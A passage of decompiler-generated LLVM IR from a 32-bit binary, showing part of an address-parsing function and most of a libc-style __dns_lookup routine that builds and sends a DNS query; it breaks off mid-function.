dec_label_pc_8055622:                             ; preds = %dec_label_pc_805560e, %dec_label_pc_8055621
  %v1_8055612 = phi i32 [ 0, %dec_label_pc_805560e ], [ %v3_8055615, %dec_label_pc_8055621 ]
  %v4_8055622 = phi i32 [ %v4_8055622.pre, %dec_label_pc_805560e ], [ %v6_8055622, %dec_label_pc_8055621 ]
  %v0_8055621 = phi i32 [ %v0_80555fe34, %dec_label_pc_805560e ], [ %v1_8055621, %dec_label_pc_8055621 ]
  %v1_8055622 = inttoptr i32 %v0_8055621 to i8*
  %v2_8055622 = load i8, i8* %v1_8055622, align 1
  %v3_8055622 = zext i8 %v2_8055622 to i32
  %v5_8055622 = and i32 %v4_8055622, -256
  %v6_8055622 = or i32 %v3_8055622, %v5_8055622
  store i32 %v6_8055622, i32* @edx, align 4
  %v2_8055624 = sext i8 %v2_8055622 to i32
  %v2_8055627 = mul nsw i32 %v2_8055624, 2
  %v3_8055627 = add i32 %v2_8055627, %v0_8055601.pre
  %v4_8055627 = inttoptr i32 %v3_8055627 to i16*
  %v5_8055627 = load i16, i16* %v4_8055627, align 2
  %v2_805562c = and i16 %v5_8055627, 8
  %v3_805562c = icmp eq i16 %v2_805562c, 0
  %v1_805562e = icmp eq i1 %v3_805562c, false
  br i1 %v1_805562e, label %dec_label_pc_8055612, label %dec_label_pc_8055630

dec_label_pc_8055630:                             ; preds = %dec_label_pc_8055622
  %v8_8055630 = sub nsw i32 2, %v2_805564a35
  %v9_8055630 = and i32 %v8_8055630, %v2_805564a35
  %v10_8055630 = icmp slt i32 %v9_8055630, 0
  %v11_8055630 = icmp eq i32 %v2_805564a35, 3
  %v12_8055630 = icmp slt i32 %v2_805564a35, 3
  %v3_8055634 = icmp eq i1 %v12_8055630, %v10_8055630
  %v4_8055634 = icmp eq i1 %v11_8055630, false
  %v5_8055634 = and i1 %v4_8055634, %v3_8055634
  br i1 %v5_8055634, label %dec_label_pc_805563e, label %dec_label_pc_8055636

dec_label_pc_8055636:                             ; preds = %dec_label_pc_8055630
  %v10_8055636 = icmp eq i8 %v2_8055622, 46
  %v1_8055639 = icmp eq i1 %v10_8055636, false
  br i1 %v1_8055639, label %dec_label_pc_8055670, label %dec_label_pc_805563b

dec_label_pc_805563b:                             ; preds = %dec_label_pc_8055636
  %v1_805563b = add i32 %v0_8055621, 1
  store i32 %v1_805563b, i32* @ecx, align 4
  br label %dec_label_pc_8055647

dec_label_pc_805563e:                             ; preds = %dec_label_pc_8055630
  %v1_805563e = add i32 %v0_8055621, 1
  store i32 %v1_805563e, i32* @ecx, align 4
  %v4_805563f = icmp eq i8 %v2_8055622, 0
  br i1 %v4_805563f, label %dec_label_pc_8055647, label %dec_label_pc_8055643

dec_label_pc_8055643:                             ; preds = %dec_label_pc_805563e
  %v2_8055643 = and i16 %v5_8055627, 32
  %v3_8055643 = icmp eq i16 %v2_8055643, 0
  br i1 %v3_8055643, label %dec_label_pc_8055670, label %dec_label_pc_8055647

dec_label_pc_8055647:                             ; preds = %dec_label_pc_8055643, %dec_label_pc_805563e, %dec_label_pc_805563b
  %v0_80555fe3 = phi i32 [ %v1_805563e, %dec_label_pc_8055643 ], [ %v1_805563e, %dec_label_pc_805563e ], [ %v1_805563b, %dec_label_pc_805563b ]
  %v2_8055647 = mul i32 %v0_805566533, 256
  %v3_805564a = add nuw nsw i32 %v2_805564a35, 1
  %v2_805564d = or i32 %v1_8055612, %v2_8055647
  %v7_8055653 = icmp sgt i32 %v2_805564a35, 3
  br i1 %v7_8055653, label %dec_label_pc_8055655, label %dec_label_pc_80555fe

dec_label_pc_8055655:                             ; preds = %dec_label_pc_8055647
  %v4_805565a = icmp eq i32 %arg2, 0
  br i1 %v4_805565a, label %dec_label_pc_8055672, label %dec_label_pc_8055661

dec_label_pc_8055661:                             ; preds = %dec_label_pc_8055655
  %v1_8055665 = call i32 @llvm.bswap.i32(i32 %v2_805564d)
  %v2_8055667 = inttoptr i32 %arg2 to i32*
  store i32 %v1_8055665, i32* %v2_8055667, align 4
  br label %dec_label_pc_8055672

dec_label_pc_8055670:                             ; preds = %dec_label_pc_8055643, %dec_label_pc_8055636, %dec_label_pc_80555fe, %dec_label_pc_8055612, %entry
  br label %dec_label_pc_8055672

dec_label_pc_8055672:                             ; preds = %dec_label_pc_8055655, %dec_label_pc_8055661, %dec_label_pc_8055670
  %v0_8055677 = phi i32 [ 1, %dec_label_pc_8055655 ], [ 1, %dec_label_pc_8055661 ], [ 0, %dec_label_pc_8055670 ]
  ret i32 %v0_8055677

; uselistorder directives
  uselistorder i32 %v2_8055624, { 1, 0 }
  uselistorder i32 %v6_8055622, { 1, 0 }
  uselistorder i8 %v2_8055622, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8055621, { 0, 1, 3, 2 }
  uselistorder i32 %v1_8055619, { 1, 0 }
  uselistorder i32 %v3_8055615, { 1, 0, 3, 2 }
  uselistorder i32 %v0_80555fe34, { 1, 0 }
  uselistorder i32 %v2_805564a35, { 1, 4, 2, 0, 5, 3 }
  uselistorder i32 (i32)* @llvm.bswap.i32, { 3, 2, 1, 0 }
  uselistorder i32 254, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8055672, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8055670, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_8055622, { 1, 0 }
  uselistorder label %dec_label_pc_80555fe, { 1, 0 }
}

define i32 @__dns_lookup(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp33 = sext i32 %arg2 to i64
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-236 = alloca i32, align 4
  %stack_var_-252 = alloca i8*, align 4
  store i32 %arg3, i32* @edi, align 4
  store i8* inttoptr (i32 512 to i8*), i8** %stack_var_-252, align 4
  %v2_805568e = call i32 @malloc(i32 512)
  store i32 %v2_805568e, i32* %eax.global-to-local, align 4
  store i8* inttoptr (i32 1025 to i8*), i8** %stack_var_-252, align 4
  store i32 %v2_805568e, i32* @ebp, align 4
  %v2_805569c = call i32 @malloc(i32 1025)
  store i32 %v2_805569c, i32* %eax.global-to-local, align 4
  %v12_80556a5 = ptrtoint i32* %stack_var_-236 to i32
  %v1_80556a8 = icmp eq i32 %v2_805568e, 0
  br i1 %v1_80556a8, label %dec_label_pc_8055d21, label %dec_label_pc_80556b0

dec_label_pc_80556b0:                             ; preds = %entry
  %v1_80556b0 = icmp eq i32 %v2_805569c, 0
  br i1 %v1_80556b0, label %dec_label_pc_8055d21, label %dec_label_pc_80556b8

dec_label_pc_80556b8:                             ; preds = %dec_label_pc_80556b0
  %v5_80556b8 = icmp eq i32 %arg2, 0
  br i1 %v5_80556b8, label %dec_label_pc_8055d21, label %dec_label_pc_80556c6

dec_label_pc_80556c6:                             ; preds = %dec_label_pc_80556b8
  %v4_80556c6 = ptrtoint i8* %arg1 to i32
  store i32 %v4_80556c6, i32* %eax.global-to-local, align 4
  %v2_80556cd = load i8, i8* %arg1, align 1
  %v3_80556cd = icmp eq i8 %v2_80556cd, 0
  br i1 %v3_80556cd, label %dec_label_pc_8055d21, label %dec_label_pc_80556d6

dec_label_pc_80556d6:                             ; preds = %dec_label_pc_80556c6
  store i8* %arg1, i8** %stack_var_-252, align 4
  %v3_80556da = call i32 @strlen(i8* nonnull %arg1)
  store i32 %v3_80556da, i32* @eax, align 4
  store i32 %v4_80556c6, i32* %edx.global-to-local, align 4
  %v2_80556fd = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_80556fd, i32* @ebx, align 4
  %tmp46 = bitcast i32* %stack_var_-52 to i8*
  store i8* %tmp46, i8** %stack_var_-252, align 4
  %v3_8055705 = call i32 @__pthread_return_void(i32 %v2_80556fd, i32 134562611)
  store i32 %v3_8055705, i32* %eax.global-to-local, align 4
  store i8* bitcast (i8** @global_var_80617a8.550 to i8*), i8** %stack_var_-252, align 4
  %v2_8055711 = call i32 @__pthread_return_0(i32 ptrtoint (i8** @global_var_80617a8.550 to i32))
  %v0_8055716 = load i64, i64* @global_var_80617c0.551, align 8
  %v1_8055716 = trunc i64 %v0_8055716 to i32
  %v1_805571b = ashr i32 %v1_8055716, 31
  %v6_805571c = and i64 %v0_8055716, 4294967295
  %v8_805571c = zext i32 %v1_805571b to i64
  %v9_805571c = mul nuw i64 %v8_805571c, 4294967296
  %v10_805571c = or i64 %v9_805571c, %v6_805571c
  %v14_805571c = srem i64 %v10_805571c, %tmp33
  %v15_805571c = trunc i64 %v14_805571c to i32
  %v0_8055723 = load i16, i16* @global_var_805b504.552, align 4
  %v2_8055732 = load i8*, i8** %stack_var_-252, align 4
  %v3_8055732 = ptrtoint i8* %v2_8055732 to i32
  store i32 %v3_8055732, i32* @eax, align 4
  store i32 134562611, i32* %edx.global-to-local, align 4
  store i8* %tmp46, i8** %stack_var_-252, align 4
  %v3_8055737 = call i32 @__pthread_return_void(i32 %v2_80556fd, i32 1)
  store i32 %v3_8055737, i32* %eax.global-to-local, align 4
  %v3_805577b = sext i16 %v0_8055723 to i32
  %v5_80558de = inttoptr i32 %v15_805571c to i8*
  %v1_8055cfc87 = add i32 %v12_80556a5, 28
  %v2_8055cfc88 = inttoptr i32 %v1_8055cfc87 to i32*
  %v3_8055cfc89 = load i32, i32* %v2_8055cfc88, align 4
  %tmp119 = icmp ult i32 %v3_8055cfc89, 3
  br i1 %tmp119, label %dec_label_pc_805575c, label %dec_label_pc_8055d21

dec_label_pc_805575c:                             ; preds = %dec_label_pc_80556d6, %dec_label_pc_8055cfc.backedge
  %v0_805576392 = phi i32 [ %v0_8055cfc.pre, %dec_label_pc_8055cfc.backedge ], [ %v12_80556a5, %dec_label_pc_80556d6 ]
  %v1_805575c = add i32 %v0_805576392, 20
  %v2_805575c = inttoptr i32 %v1_805575c to i32*
  %v3_805575c = load i32, i32* %v2_805575c, align 4
  %v13_805575c = icmp eq i32 %v3_805575c, -1
  br i1 %v13_805575c, label %dec_label_pc_805575c.dec_label_pc_8055772_crit_edge, label %dec_label_pc_8055763

dec_label_pc_805575c.dec_label_pc_8055772_crit_edge: ; preds = %dec_label_pc_805575c
  %v0_8055772.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055772

dec_label_pc_8055763:                             ; preds = %dec_label_pc_805575c
  %v3_8055766 = load i32, i32* %v2_805575c, align 4
  %v5_8055766 = add i32 %v0_805576392, -16
  %v6_8055766 = inttoptr i32 %v5_8055766 to i32*
  store i32 %v3_8055766, i32* %v6_8055766, align 4
  %v1_805576a = call i32 @__libc_close(i32 -1)
  store i32 %v1_805576a, i32* %eax.global-to-local, align 4
  %v0_805576f = load i32, i32* @esp, align 4
  %v1_805576f = add i32 %v0_805576f, 16
  br label %dec_label_pc_8055772

dec_label_pc_8055772:                             ; preds = %dec_label_pc_805575c.dec_label_pc_8055772_crit_edge, %dec_label_pc_8055763
  %v1_8055772 = phi i32 [ %v0_805576392, %dec_label_pc_805575c.dec_label_pc_8055772_crit_edge ], [ %v1_805576f, %dec_label_pc_8055763 ]
  %v0_8055772 = phi i32 [ %v0_8055772.pre, %dec_label_pc_805575c.dec_label_pc_8055772_crit_edge ], [ %v1_805576a, %dec_label_pc_8055763 ]
  %v2_8055772 = add i32 %v1_8055772, -4
  %v3_8055772 = inttoptr i32 %v2_8055772 to i32*
  store i32 %v0_8055772, i32* %v3_8055772, align 4
  %v1_8055773 = add i32 %v1_8055772, -8
  %v2_8055773 = inttoptr i32 %v1_8055773 to i32*
  store i32 512, i32* %v2_8055773, align 4
  %v1_8055778 = add i32 %v1_8055772, -12
  %v2_8055778 = inttoptr i32 %v1_8055778 to i32*
  store i32 0, i32* %v2_8055778, align 4
  %v2_805577a = add i32 %v1_8055772, -16
  %v3_805577a = inttoptr i32 %v2_805577a to i32*
  store i32 %v2_805568e, i32* %v3_805577a, align 4
  %v5_805577b = call i32 @__GI_memset(i8* inttoptr (i32 -1 to i8*), i32 %v15_805571c, i32 %v3_805577b)
  store i32 %v5_805577b, i32* %eax.global-to-local, align 4
  %v0_8055780 = load i32, i32* @esp, align 4
  %v1_8055783 = add i32 %v0_8055780, 8
  %v2_8055783 = inttoptr i32 %v1_8055783 to i32*
  store i32 48, i32* %v2_8055783, align 4
  %v1_8055785 = add i32 %v0_8055780, 4
  %v2_8055785 = inttoptr i32 %v1_8055785 to i32*
  store i32 0, i32* %v2_8055785, align 4
  %v1_8055787 = add i32 %v0_8055780, 84
  store i32 %v1_8055787, i32* @ebx, align 4
  %v3_805578b = inttoptr i32 %v0_8055780 to i32*
  store i32 %v1_8055787, i32* %v3_805578b, align 4
  %v5_805578c = call i32 @__GI_memset(i8* inttoptr (i32 -1 to i8*), i32 %v15_805571c, i32 %v3_805577b)
  store i32 %v5_805578c, i32* %eax.global-to-local, align 4
  %v0_8055791 = load i32, i32* @esp, align 4
  %v1_8055791 = add i32 %v0_8055791, 60
  %v2_8055791 = inttoptr i32 %v1_8055791 to i32*
  %v3_8055791 = load i32, i32* %v2_8055791, align 4
  store i32 %v3_8055791, i32* %eax.global-to-local, align 4
  %v1_8055795 = add i32 %v0_8055791, 116
  %v2_8055795 = inttoptr i32 %v1_8055795 to i32*
  store i32 1, i32* %v2_8055795, align 4
  %v0_805579d = load i32, i32* %eax.global-to-local, align 4
  %v1_805579d = add i32 %v0_805579d, 1
  %v0_805579e = load i32, i32* @esp, align 4
  %v1_805579e = add i32 %v0_805579e, 104
  %v2_805579e = inttoptr i32 %v1_805579e to i32*
  store i32 1, i32* %v2_805579e, align 4
  %v1_80557a6 = urem i32 %v1_805579d, 65536
  store i32 %v1_80557a6, i32* %eax.global-to-local, align 4
  %v1_80557ab = load i32, i32* @esp, align 4
  %v2_80557ab = add i32 %v1_80557ab, 60
  %v3_80557ab = inttoptr i32 %v2_80557ab to i32*
  store i32 %v1_80557a6, i32* %v3_80557ab, align 4
  %v0_80557af = load i32, i32* %eax.global-to-local, align 4
  %v1_80557af = load i32, i32* @esp, align 4
  %v2_80557af = add i32 %v1_80557af, 84
  %v3_80557af = inttoptr i32 %v2_80557af to i32*
  store i32 %v0_80557af, i32* %v3_80557af, align 4
  %v0_80557b3 = load i32, i32* @esp, align 4
  %v1_80557b6 = add i32 %v0_80557b3, 8
  %v2_80557b6 = inttoptr i32 %v1_80557b6 to i32*
  store i32 512, i32* %v2_80557b6, align 4
  %v2_80557bb = add i32 %v0_80557b3, 4
  %v3_80557bb = inttoptr i32 %v2_80557bb to i32*
  store i32 %v2_805568e, i32* %v3_80557bb, align 4
  %v0_80557bc = load i32, i32* @ebx, align 4
  %v3_80557bc = inttoptr i32 %v0_80557b3 to i32*
  store i32 %v0_80557bc, i32* %v3_80557bc, align 4
  %v0_80557bd = call i32 @__encode_header()
  store i32 %v0_80557bd, i32* %eax.global-to-local, align 4
  %v0_80557c2 = load i32, i32* @esp, align 4
  store i32 %v0_80557bd, i32* @ebx, align 4
  %v2_80557c7 = icmp slt i32 %v0_80557bd, 0
  br i1 %v2_80557c7, label %dec_label_pc_8055d21, label %dec_label_pc_80557cf

dec_label_pc_80557cf:                             ; preds = %dec_label_pc_8055772
  %v2_80557cf = add i32 %v0_80557c2, 12
  %v3_80557cf = inttoptr i32 %v2_80557cf to i32*
  store i32 %v0_80557bd, i32* %v3_80557cf, align 4
  %v1_80557d0 = add i32 %v0_80557c2, 8
  %v2_80557d0 = inttoptr i32 %v1_80557d0 to i32*
  store i32 1025, i32* %v2_80557d0, align 4
  %v1_80557d5 = add i32 %v0_80557c2, 256
  %v2_80557d5 = inttoptr i32 %v1_80557d5 to i32*
  %v3_80557d5 = load i32, i32* %v2_80557d5, align 4
  %v5_80557d5 = add i32 %v0_80557c2, 4
  %v6_80557d5 = inttoptr i32 %v5_80557d5 to i32*
  store i32 %v3_80557d5, i32* %v6_80557d5, align 4
  %v1_80557dc = add i32 %v0_80557c2, 28
  %v2_80557dc = inttoptr i32 %v1_80557dc to i32*
  %v3_80557dc = load i32, i32* %v2_80557dc, align 4
  %v6_80557dc = inttoptr i32 %v0_80557c2 to i32*
  store i32 %v3_80557dc, i32* %v6_80557dc, align 4
  %v5_80557e0 = call i32 @strncpy(i8* inttoptr (i32 -1 to i8*), i32 %v15_805571c, i32 %v3_805577b)
  %v0_80557e5 = load i32, i32* @esp, align 4
  %v1_80557e8 = add i32 %v0_80557e5, 8
  %v2_80557e8 = inttoptr i32 %v1_80557e8 to i32*
  store i32 ptrtoint (i32* @global_var_805b508.489 to i32), i32* %v2_80557e8, align 4
  %v1_80557ed = add i32 %v0_80557e5, 4
  %v2_80557ed = inttoptr i32 %v1_80557ed to i32*
  store i32 134562611, i32* %v2_80557ed, align 4
  %v1_80557f2 = add i32 %v0_80557e5, 200
  store i32 %v1_80557f2, i32* @eax, align 4
  %v3_80557f9 = inttoptr i32 %v0_80557e5 to i32*
  store i32 %v1_80557f2, i32* %v3_80557f9, align 4
  %v2_80557fa = call i32 @__pthread_return_void(i32 -1, i32 %v15_805571c)
  store i32 %v2_80557fa, i32* %eax.global-to-local, align 4
  %v0_80557ff = load i32, i32* @esp, align 4
  %v1_80557ff = inttoptr i32 %v0_80557ff to i32*
  store i32 ptrtoint (i32* @global_var_805b508.489 to i32), i32* %v1_80557ff, align 4
  %v1_8055806 = call i32 @__pthread_return_0(i32 -1)
  store i32 %v1_8055806, i32* %eax.global-to-local, align 4
  %v0_805580b = load i32, i32* @esp, align 4
  %v1_805580b = add i32 %v0_805580b, 56
  %v2_805580b = inttoptr i32 %v1_805580b to i32*
  %v3_805580b = load i32, i32* %v2_805580b, align 4
  store i32 %v3_805580b, i32* %edx.global-to-local, align 4
  %v1_805580f = add i32 %v0_805580b, 268
  %v2_805580f = inttoptr i32 %v1_805580f to i32*
  %v3_805580f = load i32, i32* %v2_805580f, align 4
  store i32 %v3_805580f, i32* %eax.global-to-local, align 4
  %v2_8055816 = mul i32 %v3_805580b, 4
  %v3_8055816 = add i32 %v3_805580f, %v2_8055816
  %v4_8055816 = inttoptr i32 %v3_8055816 to i32*
  %v5_8055816 = load i32, i32* %v4_8055816, align 4
  store i32 %v5_8055816, i32* %edx.global-to-local, align 4
  %v2_8055819 = add i32 %v0_805580b, 48
  %v3_8055819 = inttoptr i32 %v2_8055819 to i32*
  store i32 %v5_8055816, i32* %v3_8055819, align 4
  %v0_805581d = load i32, i32* @esp, align 4
  %v1_805581d = add i32 %v0_805581d, 16
  %v1_8055820 = add i32 %v0_805581d, 52
  %v2_8055820 = inttoptr i32 %v1_8055820 to i32*
  %v3_8055820 = load i32, i32* %v2_8055820, align 4
  %v5_8055820 = icmp slt i32 %v3_8055820, 0
  br i1 %v5_8055820, label %dec_label_pc_80557cf.dec_label_pc_8055866_crit_edge, label %dec_label_pc_8055827

dec_label_pc_80557cf.dec_label_pc_8055866_crit_edge: ; preds = %dec_label_pc_80557cf
  %v0_8055866.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055866

dec_label_pc_8055827:                             ; preds = %dec_label_pc_80557cf
  store i32 %v3_8055820, i32* %eax.global-to-local, align 4
  %v1_805582b = load i32, i32* @global_var_8061bf8.553, align 8
  %v2_805582b = sub i32 %v3_8055820, %v1_805582b
  %v8_805582b = xor i32 %v1_805582b, %v3_8055820
  %v9_805582b = xor i32 %v2_805582b, %v3_8055820
  %v10_805582b = and i32 %v9_805582b, %v8_805582b
  %v11_805582b = icmp slt i32 %v10_805582b, 0
  %v13_805582b = icmp slt i32 %v2_805582b, 0
  %v2_8055831 = icmp eq i1 %v13_805582b, %v11_805582b
  br i1 %v2_8055831, label %dec_label_pc_8055866, label %dec_label_pc_8055833

dec_label_pc_8055833:                             ; preds = %dec_label_pc_8055827
  %v2_8055833 = add i32 %v0_805581d, 12
  %v3_8055833 = inttoptr i32 %v2_8055833 to i32*
  store i32 %v3_8055820, i32* %v3_8055833, align 4
  %v1_8055834 = add i32 %v0_805581d, 8
  %v2_8055834 = inttoptr i32 %v1_8055834 to i32*
  store i32 1025, i32* %v2_8055834, align 4
  %v1_8055839 = add i32 %v0_805581d, 4
  %v2_8055839 = inttoptr i32 %v1_8055839 to i32*
  store i32 ptrtoint (i32* @global_var_805a59c.554 to i32), i32* %v2_8055839, align 4
  %v1_805583e = add i32 %v0_805581d, 28
  %v2_805583e = inttoptr i32 %v1_805583e to i32*
  %v3_805583e = load i32, i32* %v2_805583e, align 4
  %v6_805583e = inttoptr i32 %v0_805581d to i32*
  store i32 %v3_805583e, i32* %v6_805583e, align 4
  %v0_8055842 = call i32 @__GI_strncat()
  store i32 %v0_8055842, i32* %eax.global-to-local, align 4
  %v0_8055847 = load i32, i32* @esp, align 4
  %v1_805584a = add i32 %v0_8055847, 8
  %v2_805584a = inttoptr i32 %v1_805584a to i32*
  store i32 1025, i32* %v2_805584a, align 4
  %v1_805584f = add i32 %v0_8055847, 52
  %v2_805584f = inttoptr i32 %v1_805584f to i32*
  %v3_805584f = load i32, i32* %v2_805584f, align 4
  store i32 %v3_805584f, i32* %edx.global-to-local, align 4
  %v1_8055853 = mul i32 %v3_805584f, 4
  %v2_8055853 = add i32 %v1_8055853, 134618072
  %v3_8055853 = inttoptr i32 %v2_8055853 to i32*
  %v4_8055853 = load i32, i32* %v3_8055853, align 4
  %v6_8055853 = add i32 %v0_8055847, 4
  %v7_8055853 = inttoptr i32 %v6_8055853 to i32*
  store i32 %v4_8055853, i32* %v7_8055853, align 4
  %v1_805585a = add i32 %v0_8055847, 28
  %v2_805585a = inttoptr i32 %v1_805585a to i32*
  %v3_805585a = load i32, i32* %v2_805585a, align 4
  %v6_805585a = inttoptr i32 %v0_8055847 to i32*
  store i32 %v3_805585a, i32* %v6_805585a, align 4
  %v0_805585e = call i32 @__GI_strncat()
  store i32 %v0_805585e, i32* %eax.global-to-local, align 4
  %v0_8055863 = load i32, i32* @esp, align 4
  %v1_8055863 = add i32 %v0_8055863, 16
  br label %dec_label_pc_8055866

dec_label_pc_8055866:                             ; preds = %dec_label_pc_80557cf.dec_label_pc_8055866_crit_edge, %dec_label_pc_8055827, %dec_label_pc_8055833
  %v1_8055866 = phi i32 [ %v1_805581d, %dec_label_pc_80557cf.dec_label_pc_8055866_crit_edge ], [ %v1_805581d, %dec_label_pc_8055827 ], [ %v1_8055863, %dec_label_pc_8055833 ]
  %v0_8055866 = phi i32 [ %v0_8055866.pre, %dec_label_pc_80557cf.dec_label_pc_8055866_crit_edge ], [ %v3_8055820, %dec_label_pc_8055827 ], [ %v0_805585e, %dec_label_pc_8055833 ]
  %v2_8055866 = add i32 %v1_8055866, -4
  %v3_8055866 = inttoptr i32 %v2_8055866 to i32*
  store i32 %v0_8055866, i32* %v3_8055866, align 4
  %v0_8055867 = load i32, i32* %eax.global-to-local, align 4
  %v2_8055867 = add i32 %v1_8055866, -8
  %v3_8055867 = inttoptr i32 %v2_8055867 to i32*
  store i32 %v0_8055867, i32* %v3_8055867, align 4
  %v1_8055868 = add i32 %v1_8055866, -12
  %v2_8055868 = inttoptr i32 %v1_8055868 to i32*
  store i32 1, i32* %v2_8055868, align 4
  %v1_805586a = add i32 %v1_8055866, 184
  store i32 %v1_805586a, i32* @eax, align 4
  %v2_8055871 = add i32 %v1_8055866, -16
  %v3_8055871 = inttoptr i32 %v2_8055871 to i32*
  store i32 %v1_805586a, i32* %v3_8055871, align 4
  %v2_8055872 = call i32 @__pthread_return_void(i32 -1, i32 %v15_805571c)
  store i32 %v2_8055872, i32* %eax.global-to-local, align 4
  %v0_8055877 = load i32, i32* @esp, align 4
  %v1_8055877 = add i32 %v0_8055877, 28
  %v2_8055877 = inttoptr i32 %v1_8055877 to i32*
  %v3_8055877 = load i32, i32* %v2_8055877, align 4
  store i32 %v3_8055877, i32* %eax.global-to-local, align 4
  %v1_805587b = add i32 %v0_8055877, 260
  %v2_805587b = inttoptr i32 %v1_805587b to i32*
  %v3_805587b = load i32, i32* %v2_805587b, align 4
  store i32 %v3_805587b, i32* @edx, align 4
  %v2_8055882 = add i32 %v0_8055877, 216
  %v3_8055882 = inttoptr i32 %v2_8055882 to i32*
  store i32 %v3_8055877, i32* %v3_8055882, align 4
  %v0_8055889 = load i32, i32* @edx, align 4
  %v1_8055889 = load i32, i32* @esp, align 4
  %v2_8055889 = add i32 %v1_8055889, 220
  %v3_8055889 = inttoptr i32 %v2_8055889 to i32*
  store i32 %v0_8055889, i32* %v3_8055889, align 4
  %v0_8055890 = load i32, i32* @esp, align 4
  %v1_8055890 = add i32 %v0_8055890, 224
  %v2_8055890 = inttoptr i32 %v1_8055890 to i32*
  store i32 1, i32* %v2_8055890, align 4
  %v0_80558a0 = load i32, i32* @esp, align 4
  %v1_80558a3 = load i32, i32* @ebx, align 4
  %v2_80558a3 = sub i32 512, %v1_80558a3
  %v2_80558a5 = add i32 %v0_80558a0, 8
  %v3_80558a5 = inttoptr i32 %v2_80558a5 to i32*
  store i32 %v2_80558a3, i32* %v3_80558a5, align 4
  %v1_80558a6 = load i32, i32* @ebx, align 4
  %v2_80558a6 = add i32 %v1_80558a6, %v2_805568e
  %v2_80558aa = add i32 %v0_80558a0, 4
  %v3_80558aa = inttoptr i32 %v2_80558aa to i32*
  store i32 %v2_80558a6, i32* %v3_80558aa, align 4
  %v1_80558ab = add i32 %v0_80558a0, 216
  store i32 %v1_80558ab, i32* @eax, align 4
  %v3_80558b2 = inttoptr i32 %v0_80558a0 to i32*
  store i32 %v1_80558ab, i32* %v3_80558b2, align 4
  %v0_80558b3 = call i32 @__encode_question()
  store i32 %v0_80558b3, i32* %eax.global-to-local, align 4
  %v0_80558b8 = load i32, i32* @esp, align 4
  store i32 %v0_80558b3, i32* @esi, align 4
  %v2_80558bd = icmp slt i32 %v0_80558b3, 0
  br i1 %v2_80558bd, label %dec_label_pc_8055d21, label %dec_label_pc_80558c5

dec_label_pc_80558c5:                             ; preds = %dec_label_pc_8055866
  %v1_80558c5 = add i32 %v0_80558b8, 172
  %v2_80558c5 = inttoptr i32 %v1_80558c5 to i16*
  store i16 2, i16* %v2_80558c5, align 2
  %v1_80558cf = load i32, i32* @esp, align 4
  %v2_80558cf = add i32 %v1_80558cf, -4
  %v3_80558cf = inttoptr i32 %v2_80558cf to i32*
  store i32 %v0_80558b3, i32* %v3_80558cf, align 4
  %v1_80558d0 = add i32 %v1_80558cf, 164
  store i32 %v1_80558d0, i32* %eax.global-to-local, align 4
  %v2_80558d7 = add i32 %v1_80558cf, -8
  %v3_80558d7 = inttoptr i32 %v2_80558d7 to i32*
  store i32 %v1_80558d0, i32* %v3_80558d7, align 4
  %v1_80558d8 = add i32 %v1_80558cf, 32
  %v2_80558d8 = inttoptr i32 %v1_80558d8 to i32*
  %v3_80558d8 = load i32, i32* %v2_80558d8, align 4
  %v5_80558d8 = add i32 %v1_80558cf, -12
  %v6_80558d8 = inttoptr i32 %v5_80558d8 to i32*
  store i32 %v3_80558d8, i32* %v6_80558d8, align 4
  %v1_80558dc = add i32 %v1_80558cf, -16
  %v2_80558dc = inttoptr i32 %v1_80558dc to i32*
  store i32 10, i32* %v2_80558dc, align 4
  %v6_80558de = call i32 @inet_pton(i32 -1, i8* %v5_80558de, i32 %v3_805577b, i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_80558de, i32* %eax.global-to-local, align 4
  %v0_80558e3 = load i32, i32* @esp, align 4
  %v1_80558e3 = add i32 %v0_80558e3, 16
  %tmp47 = icmp slt i32 %v6_80558de, 1
  br i1 %tmp47, label %dec_label_pc_80558f4, label %dec_label_pc_80558ea

dec_label_pc_80558ea:                             ; preds = %dec_label_pc_80558c5
  %v1_80558ea = add i32 %v0_80558e3, 172
  %v2_80558ea = inttoptr i32 %v1_80558ea to i16*
  store i16 10, i16* %v2_80558ea, align 2
  %v0_80558f4.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80558f4

dec_label_pc_80558f4:                             ; preds = %dec_label_pc_80558c5, %dec_label_pc_80558ea
  %v0_805590b = phi i32 [ %v1_80558e3, %dec_label_pc_80558c5 ], [ %v0_80558f4.pre, %dec_label_pc_80558ea ]
  %v1_80558f4 = add i32 %v0_805590b, 156
  %v2_80558f4 = inttoptr i32 %v1_80558f4 to i16*
  %v3_80558f4 = load i16, i16* %v2_80558f4, align 2
  %v12_80558f4 = icmp eq i16 %v3_80558f4, 10
  %v1_80558fd = icmp eq i1 %v12_80558f4, false
  %v1_805590b = add i32 %v0_805590b, 158
  %v2_805590b = inttoptr i32 %v1_805590b to i16*
  store i16 13568, i16* %v2_805590b, align 2
  %v0_8055915 = load i32, i32* @esp, align 4
  br i1 %v1_80558fd, label %dec_label_pc_805590b, label %dec_label_pc_805592b

dec_label_pc_805590b:                             ; preds = %dec_label_pc_80558f4
  %v1_8055918 = add i32 %v0_8055915, 32
  %v2_8055918 = inttoptr i32 %v1_8055918 to i32*
  %v3_8055918 = load i32, i32* %v2_8055918, align 4
  %v5_8055918 = add i32 %v0_8055915, -16
  %v6_8055918 = inttoptr i32 %v5_8055918 to i32*
  store i32 %v3_8055918, i32* %v6_8055918, align 4
  %v1_805591c = call i32 @inet_addr(i32 -1)
  store i32 %v1_805591c, i32* %eax.global-to-local, align 4
  %v1_8055921 = load i32, i32* @esp, align 4
  %v2_8055921 = add i32 %v1_8055921, 176
  %v3_8055921 = inttoptr i32 %v2_8055921 to i32*
  store i32 %v1_805591c, i32* %v3_8055921, align 4
  %v0_8055928 = load i32, i32* @esp, align 4
  %v1_8055928 = add i32 %v0_8055928, 16
  br label %dec_label_pc_805592b

